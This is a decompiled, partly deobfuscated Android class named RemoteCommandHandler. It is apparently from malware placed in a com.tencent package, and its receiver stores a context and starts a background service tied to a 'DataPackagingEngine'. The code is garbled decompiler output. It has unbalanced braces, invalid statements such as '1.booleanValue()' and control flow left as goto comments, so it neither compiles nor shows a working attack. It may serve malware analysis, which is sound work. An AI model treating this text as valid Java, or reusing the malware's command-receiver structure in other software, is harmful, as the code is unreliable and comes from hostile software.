package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: RemoteCommandHandler
 * Original: Lcom/tencent/RC;
 */
public class RemoteCommandHandler extends BroadcastReceiver {

    // === METHODS ===

    public void Constructor() {
        // new BroadcastReceiver()
        return;
    }

    public void onReceive(Context param0, Intent param1) {
        v0 = v2.getResources();
        v0 = 2131296274;
        v3 = v3.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v3;
        v3 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        if (v3 != null && v3 != 0) { // goto +4
        MainBackgroundService.app_tunesxconcerningn1011_Context = v2;
        v3 = MainBackgroundService.class;
        BackgroundServiceHelper.removedqtractort40(v3, v2);
        if (v3 == null || v3 == 0) { // goto +73
        v3 = v2.getResources();
        v3 = v3.getString(2131296274);
        DataPackagingEngine.p_tunesxconcerningn103_r = v3;
        v3 = new Intent();
        // new Intent(v2, 2131296274)
        v2.startService(v3);
        // goto (branch)
        v2 = 1;
        v0 = Boolean.valueOf(1);
        v0 = 1.booleanValue();
        v0 = 0;
        if (v3 == null || v3 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v3 == null || v3 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (v3 == null || v3 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        1.booleanValue();
        if (1 == null || 1 == 0) { // goto +7
        Boolean.valueOf(0);
        // goto (branch)
        return;
    }
}
